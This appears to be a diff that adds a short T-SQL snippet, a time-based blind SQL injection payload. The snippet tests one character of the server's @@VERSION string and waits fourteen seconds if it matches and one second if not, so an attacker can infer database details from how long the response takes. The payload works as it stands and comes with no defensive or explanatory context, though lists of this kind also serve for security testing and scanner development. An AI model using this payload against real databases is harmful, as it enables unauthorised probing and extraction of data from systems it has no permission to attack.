@@ -1,0 +1,6 @@
+DECLARE @x as int;
+DECLARE @w as char(6);
+SET @x= ASCII(SUBSTRING(@@VERSION, 2, 1)); 
+IF @x=105 SET @w='0:0:14' ELSE SET @w='0:0:01';
+WAITFOR DELAY @w
+                
